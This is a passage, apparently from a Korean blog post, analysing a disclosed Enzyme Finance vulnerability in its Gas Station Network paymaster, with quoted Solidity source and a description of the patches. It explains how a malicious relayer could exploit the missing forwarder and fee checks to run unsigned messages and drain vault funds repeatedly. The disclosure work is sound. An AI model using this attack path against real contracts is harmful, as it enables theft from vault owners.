이어서 가장 중요한 매개변수는 GsnTypes.RelayRequest 구조체이다. 이 구조체는 GSNTypes.sol 인터페이스에 포함되어 있다. 위 코드를 보면 RelayRequest 구조체가 정의되어 있고, IForwarder 인터페이스에는 ForwardRequest가 정의되어 있다.  Gsntypes          gasPrice : 지불할 가스의 단위당 가격      pctRelayFee : 중계자에게 수수료로 지불할 비용의 비율      baseRelayFee : 지불과 상관없이 부과되는 기본료      paymaster : Paymaster는 Relay 요청을 수락하거나 거부      forwarder : 원래 보낸 사람이 보낸 메시지를 확인하는 신뢰할 수 있는 forwarder      paymasterData : true라면 Paymaster 잔액을 다시 0.5 이더로 충전        IForwarder          from : Relay 요청을 하는 Vault 소유자      to : Receipient 컨트랙트 ( 이 경우 comptrollerLib 또는 VaultProxy)      value: 함수 호출에 전송될 이더리움 금액      gas : 이 거래를 실행하기 위해 전송된 가스      nonce : Replay 공격을 방지하기 위한 임시 메시지      data : 기능 선택기 및 입력 데이터 포함      validUntil : 마감 시간      각 구조체의 input의 목적은 위와 같다.GSN with Enzyme Finance  GasRelayPaymasterLib — Paymaster Contract  ComptrollerLib — Recipient ContractEnzyme Finance에서는 Paymaster 컨트랙트는 GasRelayPaymasterLib, Recipient 컨트랙트는 ComptrollerLib라는 컨트랙트를 구현해서 사용하고 있었다.ComptrollerLib (Recipient)ComptrollerLib는 Vault 소유자가 수행하는 다양한 기능을 처리하기 위해 Enzyme Finance에서 개발한 Recipient 컨트랙트이다. 업그레이드할 수 없는 프록시인 ComptrollerProxy를 ComptrollerLib에 위임하여 이를 통해서 ComptrollerLib로 엑세스할 수 있다./// @notice Calls a specified action on an Extension/// @param _extension The Extension contract to call (e.g., FeeManager)/// @param _actionId An ID representing the action to take on the extension (see extension)/// @param _callArgs The encoded data for the call/// @dev Used to route arbitrary calls, so that msg.sender is the ComptrollerProxy/// (for access control). Uses a mutex of sorts that allows \"permissioned vault actions\"/// during calls originating from this function.function callOnExtension(address _extension, uint256 _actionId, bytes calldata _callArgs)externaloverridelocksReentranceallowsPermissionedVaultAction {    require(        _extension == getFeeManager() || _extension == getIntegrationManager() ||        _extension == getExternalPositionManager(),        \"callOnExtension: _extension invalid\"    );    IExtension(_extension).receiveCallFromComptroller(__msgSender(), _actionId, _callArgs);}호출할 주요 함수 중 하나는 callOnExtenstion()이라는 함수이다. 이 함수의 매개변수로는 확장자 계약의 주소, 해당 확장 계약에서 원하는 작업을 지정하는 작업 ID, callArgs이 있다./// @notice Makes an arbitrary call with the VaultProxy contract as the sender/// @param _contract The contract to call/// @param _selector The selector to call/// @param _encodedArgs The encoded arguments for the call/// @return returnData_ The data returned by the callfunction vaultCallOnContract(address _contract, bytes4 _selector, bytes calldata _encodedArgs)externaloverrideonlyOwnerreturns(bytes memory returnData_) {    require(        IFundDeployer(getFundDeployer()).isAllowedVaultCall(_contract, _selector, keccak256(_encodedArgs)),        \"vaultCallOnContract: Not allowed\"    );    return IVault(getVaultProxy()).callOnContract(_contract, abi.encodePacked(_selector, _encodedArgs));}/// @notice Buys back shares collected as protocol fee at a discounted shares price, using MLN/// @param _sharesAmount The amount of shares to buy backfunction buyBackProtocolFeeShares(uint256 _sharesAmount) external override {    address vaultProxyCopy = vaultProxy;    require(IVault(vaultProxyCopy).canManageAssets(__msgSender()), \"buyBackProtocolFeeShares: Unauthorized\");    uint256 gav = calcGav();    IVault(vaultProxyCopy).buyBackProtocolFeeShares(        _sharesAmount, __getBuybackValueInMln(vaultProxyCopy, _sharesAmount, gav), gav    );}/// @notice Sets whether to attempt to buyback protocol fee shares immediately when collected/// @param _nextAutoProtocolFeeSharesBuyback True if protocol fee shares should be attempted/// to be bought back immediately when collectedfunction setAutoProtocolFeeSharesBuyback(bool _nextAutoProtocolFeeSharesBuyback) external override onlyOwner {    autoProtocolFeeSharesBuyback = _nextAutoProtocolFeeSharesBuyback;    emit AutoProtocolFeeSharesBuybackSet(_nextAutoProtocolFeeSharesBuyback);}Vault는 확장 계약으로 작동할 수 있는 feeManager, IntegrationManager, externalPositionManager 컨트랙트를 인식한다. 또한 이 컨트랙트 내의 다른 대상 함수인 vaultCallOnContract(), buyBackProtocolFeeShares(), setAutoProtocolFeeSharesBuyBack()도 Relayer가 호출할 수 있다. 이 모든 함수는 볼트 소유자가 볼트 내의 자산을 관리할 때 수행하는 작업과 관련된 함수들이다.GasRelayPaymasterLib (Paymaster)이 컨트랙트는 IGasRelayPayMaster에서 상속되며 위에서 설명한 preRelayedCall(), postRelayedCall()이라는 함수를 포함하고 있다. 이는 GasRelayPaymentFactory에 의해 배포되는 BeaconProxy이라는 프록시를 통해 액세스할 수 있다./// @notice Checks whether the paymaster will pay for a given relayed tx/// @param _relayRequest The full relay request structure/// @return context_ The tx signer and the fn sig, encoded so that it can be passed to `postRelayCall`/// @return rejectOnRecipientRevert_ Always falsefunction preRelayedCall(    IGsnTypes.RelayRequest calldata _relayRequest,    bytes calldata,    bytes calldata,    uint256)externaloverriderelayHubOnlyreturns(bytes memory context_, bool rejectOnRecipientRevert_) {    address vaultProxy = getParentVault();    require(        IVault(vaultProxy).canRelayCalls(_relayRequest.request.from),        \"preRelayedCall: Unauthorized caller\"    );    bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);    require(        __isAllowedCall(            vaultProxy,            _relayRequest.request.to,            selector,            _relayRequest.request.data        ),        \"preRelayedCall: Function call not permitted\"    );    return (abi.encode(_relayRequest.request.from, selector), false);}GasRelayPaymasterLib.sol에 구현되어 있는 preRelayedCall() 함수를 보면 RelayHub만 이를 호출할 수 있는 것을 볼 수 있다. IVault(vaultProxy).canRelayCalls() 함수는 요청 발신자가 볼트 소유자인지 또는 Relay 호출을 할 수 있는 승인된 주소인지 확인한다. 이후에 __isAllowedCall() 함수를 호출하여 relay 요청의 기능 선택기가 사전 승인된 선택기 세트와 일치하는지 확인한다./// @dev Helper to check if a contract call is allowed to be relayed using this paymaster/// Allowed contracts are:/// - VaultProxy/// - ComptrollerProxy/// - PolicyManager/// - FundDeployerfunction __isAllowedCall(    address _vaultProxy,    address _contract,    bytes4 _selector,    bytes calldata _txData) private view returns(bool allowed_) {    if (_contract == _vaultProxy) {        // All calls to the VaultProxy are allowed        return true;    }    address parentComptroller = __getComptrollerForVault(_vaultProxy);    if (_contract == parentComptroller) {        if (            _selector == ComptrollerLib.callOnExtension.selector ||            _selector == ComptrollerLib.vaultCallOnContract.selector ||            _selector == ComptrollerLib.buyBackProtocolFeeShares.selector ||            _selector == ComptrollerLib.depositToGasRelayPaymaster.selector ||            _selector == ComptrollerLib.setAutoProtocolFeeSharesBuyback.selector        ) {            return true;        }    } else if (_contract == ComptrollerLib(parentComptroller).getPolicyManager()) {        if (            _selector == PolicyManager.updatePolicySettingsForFund.selector ||            _selector == PolicyManager.enablePolicyForFund.selector ||            _selector == PolicyManager.disablePolicyForFund.selector        ) {            return __parseTxDataFirstParameterAsAddress(_txData) == getParentComptroller();        }    } else if (_contract == ComptrollerLib(parentComptroller).getFundDeployer()) {        if (            _selector == FundDeployer.createReconfigurationRequest.selector ||            _selector == FundDeployer.executeReconfiguration.selector ||            _selector == FundDeployer.cancelReconfiguration.selector        ) {            return __parseTxDataFirstParameterAsAddress(_txData) == getParentVault();        }    }    return false;}__isAllowedCall() 함수는 위와 같다./// @notice Called by the relay hub after the relayed tx is executed, tops up deposit if flag passed through paymasterdata is true/// @param _context The context constructed by preRelayedCall (used to pass data from pre to post relayed call)/// @param _success Whether or not the relayed tx succeed/// @param _relayData The relay params of the request. can be used by relayHub.calculateCharge()function postRelayedCall(    bytes calldata _context,    bool _success,    uint256,    IGsnTypes.RelayData calldata _relayData) external override relayHubOnly {    bool shouldTopUpDeposit = abi.decode(_relayData.paymasterData, (bool));    if (shouldTopUpDeposit) {        __depositMax();    }    (address spender, bytes4 selector) = abi.decode(_context, (address, bytes4));    emit TransactionRelayed(spender, selector, _success);}postRelayedCall() 함수는 위와 같다. 이 함수 또한 relayHubOnly 수정자를 통해서 RelayHub에서만 호출될 수 있도록 하는 것을 볼 수 있다. 또한 relay 요청으로 전달된 paymasterData의 값이 true라면 __depositMax() 함수를 호출하는 것을 볼 수 있다.uint256 private constant DEPOSIT = 0.5 ether;(skip)// PRIVATE FUNCTIONS/// @dev Helper to pull WETH from the associated vault to top up to the max ETH deposit in the relay hubfunction __depositMax() private {    uint256 prevDeposit = getRelayHubDeposit();    if (prevDeposit &lt; DEPOSIT) {        uint256 amount = DEPOSIT.sub(prevDeposit);        IGasRelayPaymasterDepositor(getParentComptroller()).pullWethForGasRelayer(amount);        IWETH(getWethToken()).withdraw(amount);        IGsnRelayHub(getHubAddr()).depositFor {            value: amount        }(address(this));        emit Deposited(amount);    }}__depositMax() 함수는 Paymaster에 0.5 ether를 충전한다. 이 잔액을 충전하기 위해 WETH를 Vault에서 가져와 eth로 변환한 다음 RelayHub로 전송한다.최종적으로 Enzyme Finance에서 Gas Relay의 흐름도는 위와 같다.취약점 분석사실 이미 위의 내용에서 간접적으로 취약점을 설명했다.function _verifyForwarder(GsnTypes.RelayRequest calldata relayRequest)publicview {    require(address(_trustedForwarder) == relayRequest.relayData.forwarder, \"Forwarder is not trusted\");    GsnEip712Library.verifyForwarderTrusted(relayRequest);}// other libfunction verifyForwarderTrusted(GsnTypes.RelayRequest calldata relayRequest) internal view {    (bool success, bytes memory ret) = relayRequest.request.to.staticcall(        abi.encodeWithSelector(            IRelayRecipient.isTrustedForwarder.selector, relayRequest.relayData.forwarder        )    );    require(success, \"isTrustedForwarder: reverted\");    require(ret.length == 32, \"isTrustedForwarder: bad response\");    require(abi.decode(ret, (bool)), \"invalid forwarder for recipient\");}GSN에서 제공해주는 Paymaster 테스트 컨트랙트인 TestPaymasterEverythingAccepted의 preRelayedCall() 함수에서는 _verifyForwarder() 함수를 호출해서 Paymaster와 recipient 모두가 forwarder를 승인하는지 확인하는 과정을 거친다.오른쪽이 테스트 컨트랙트인 TestPaymasterEverythingAccepted이고, 왼쪽이 Enzyme Finance의 실제로 사용된 Paymaster 컨트랙트인 GasRelayPaymasterLib이다. GasRelayPaymasterLib의 preRelayedCall() 함수 내부를 보면 forwarder를 검증하는 함수가 없는 것을 확인할 수 있다. 이것이 첫 번째 취약점이다.Enzyme 팀은 preRelayedCall()의 사용자 정의된 함수를 만들었지만 Paymaster와 recipient가 사용하는 forwarder가 Relay 요청에서 전송된 forwarder와 일치한지 검증하는 필수적인 검사를 빼먹은 것이다. 이 forwarder 컨트랙트의 유일한 역할은 원래 Relay 요청이 올바른 저장소 소유자에 의해 서명되었는지 확인하는 것이다. 이로 인해서 Recipient 컨트랙트는 forwarder를 신뢰하는 forwarder가 확인 작업을 이미 수행했다는 가정하고, 추가 확인 없이 메시지를 실행 시키는 것이다. 그럼 계속 설명했던 “신뢰”하는의 의미가 정확이 무엇인지 GSN의 RelayHub.sol 코드를 통해 이해를 해야 한다.// Calls to the recipient are performed atomically inside an inner transaction which may revert in case of// errors in the recipient. In either case (revert or regular execution) the return data encodes the// RelayCallStatus value.(bool success, bytes memory relayCallStatus) = address(this).call {    gas: innerGasLimit}(    abi.encodeWithSelector(RelayHub.innerRelayCall.selector, relayRequest, signature, approvalData, vars.gasAndDataLimits,        _tmpInitialGas - gasleft(),        vars.maxPossibleGas    ));  preRelayedCall() 함수를 호출해 Paymaster가 요청을 수락하는지 확인  Relay 요청을 검증하기 위해 forwarder를 호출  Recipient에서 메시지 실행  postRelayedCall() 함수가 호출되어 필요한 경우 paymaster eth 잔액을 0.5 ether로 충전RelayHub.sol의 RelayCall 함수의 snippet이다. 위 snippet을 보면 innerRelayCall() 함수를 호출하는데 이 함수는 총 위와 같은 4가지의 주요 작업이 수행된다.// We now perform the actual charge calculation, based on the measured gas useduint256 gasUsed = (externalGasLimit - gasleft()) + config.gasOverhead;uint256 charge = calculateCharge(gasUsed, relayRequest.relayData);balances[relayRequest.relayData.paymaster] = balances[relayRequest.relayData.paymaster].sub(charge);balances[vars.relayManager] = balances[vars.relayManager].add(charge);위 snippet은 해당 시점까지 소비된 실제 가스가 계산되고 paymaster에 공제되어야 하는 관련 요금이 계산된다. 그리고 이 요금은 paymaster에서 공제되고 중개자와 연결된 해당 중개 관리자에게 추가된다. 이는 중개자가 악의적인 forwarder 주소로 Relay 요청을 생성하고 Vault 소유자가 서명하지 않은 가짜 메시지를 실행하고 여전히 지불을 받을 수 있음을 의미한다.interface GsnTypes {    /// @notice gasPrice, pctRelayFee and baseRelayFee must be validated inside of the paymaster's preRelayedCall in order not to overpay    struct RelayData {        uint256 gasPrice;        uint256 pctRelayFee;        uint256 baseRelayFee;        address relayWorker;        address paymaster;        address forwarder;        bytes paymasterData;        uint256 clientId;    }    //note: must start with the ForwardRequest to be an extension of the generic forwarder    struct RelayRequest {        IForwarder.ForwardRequest request;        RelayData relayData;    }}위 코드에서는 두 번째 취약점에 대한 정보가 있다. @notice를 보면 gasPrice, pctRelayFee, baseRelayFee는 paymaster의 preRelayedCall() 함수 내부에서 검증되어야 한다고 한다.function preRelayedCall(    IGsnTypes.RelayRequest calldata _relayRequest,    bytes calldata,    bytes calldata,    uint256)externaloverriderelayHubOnlyreturns(bytes memory context_, bool rejectOnRecipientRevert_) {    address vaultProxy = getParentVault();    require(        IVault(vaultProxy).canRelayCalls(_relayRequest.request.from),        \"preRelayedCall: Unauthorized caller\"    );    bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);    require(        __isAllowedCall(            vaultProxy,            _relayRequest.request.to,            selector,            _relayRequest.request.data        ),        \"preRelayedCall: Function call not permitted\"    );    return (abi.encode(_relayRequest.request.from, selector), false);}그러나 Enzyme Finance의 paymaster의 preRelayedCall() 함수 내부에서는 gasPrice, pctRelayFee, baseRelayFee에 대해서 검증하고 있지 않은 것을 볼 수 있다. 이 문제가 취약한 이유는 RelayHub 내에서 호출되는 calculateCharge() 함수를 통해 알 수 있다.function calculateCharge(uint256 gasUsed, GsnTypes.RelayData calldata relayData) public override virtual view returns(uint256) {    return relayData.baseRelayFee.add((gasUsed.mul(relayData.gasPrice).mul(relayData.pctRelayFee.add(100))).div(100));}calculateCharge() 함수는 위와 같이 구현되어 있다. 요금을 계산할 때, Relay 요청 데이터인 baseRelayFee, gasPrice, pctRelayFee 값을 기반으로 요금을 계산하는 것을 볼 수 있다. 즉, preRelayedCall() 함수에서 gasPrice, pctRelayFee, baseRelayFee에 대한 검증이 없기 때문에 악의적인 중개자는 baseRelayFee 또는 pctRelayFee를 매우 높은 값으로 설정하여 전제 저장소를 고갈 시킬 수 있다.여기서 하나의 제한이 있다. Enzyme Finance의 docs에서 Vault 설정 부분을 보면 gas relayer에는 최대 0.2 eth만 보유할 수 있다는 규약이 있다.uint256 private constant DEPOSIT = 0.5 ether;(skip)// PRIVATE FUNCTIONS/// @dev Helper to pull WETH from the associated vault to top up to the max ETH deposit in the relay hubfunction __depositMax() private {    uint256 prevDeposit = getRelayHubDeposit();    if (prevDeposit &lt; DEPOSIT) {        uint256 amount = DEPOSIT.sub(prevDeposit);        IGasRelayPaymasterDepositor(getParentComptroller()).pullWethForGasRelayer(amount);        IWETH(getWethToken()).withdraw(amount);        IGsnRelayHub(getHubAddr()).depositFor {            value: amount        }(address(this));        emit Deposited(amount);    }}그러나 위에서 설명한 내용에 따르면 Enzyme Paymaster 컨트랙트 내에 postRelayCall() 함수 내에서는 Relay 요청 데이터의 paymasterData가 true로 설정되어 있다면 __depositMax() 함수를 이용해 0.5 eth로 채운다는 것이다. 이를 악용하여 악의적인 중개자는 반복적으로  호출을 하고, 각 호출마다 0.5 ETH를 소모할 수 있다. 금고가 고갈되었음에도 불구하고 이는 다시 채워져 다음 공격에 대비할 수 있다.취약점 패치Enzyme Finance 팀은 첫 번째 취약점을 위와 같이 신뢰하는 forwarder 검사를 하는 코드를 추가하여 패치했다.두 번째 취약점은 위와 같이 Relay 요청 데이터인 baseRelayFee와 pctRelayFee의 값을 검증하는 과정을 추가하여 패치했다.마무리이 취약점이 발생한 근본 원인은 결국에 검증해야 할 값을 검증하지 않았기 때문에 발생한 취약점이다. 대부분의 취약점들이 마찬가지지만 이처럼 검사를 하지 않아도 기능상에는 문제가 없지만 보안 이슈로 이어지는 경우가 많이 있다. Smart Contract에서도 취약점이 발생하는 이유는 결국 권한 검증 부재와 같이 검증 부재로 인해서 많은 취약점이 발생한다.그리고 Enzyme Finance의 경우에는 GSN라는 오픈소스를 이용하여 사용자가 가스 없이 편리하게 사용하도록 서비스를 구현하는데는 성공하였지만 정해진 지침에 따라 모든 기능을 제대로 구현하지 않았기 때문에 취약점이 발생한 것이다. 이처럼 다른 컨트랙트에서도 오픈소스를 기능적으로만 보고 보안적으로는 제대로 관리하지 않은 것들이 무수히 많을 것이기 때문에 이러한 부분으로 연구를 해가며 취약점을 찾을 수 있을 거 같다."
  }
  
]

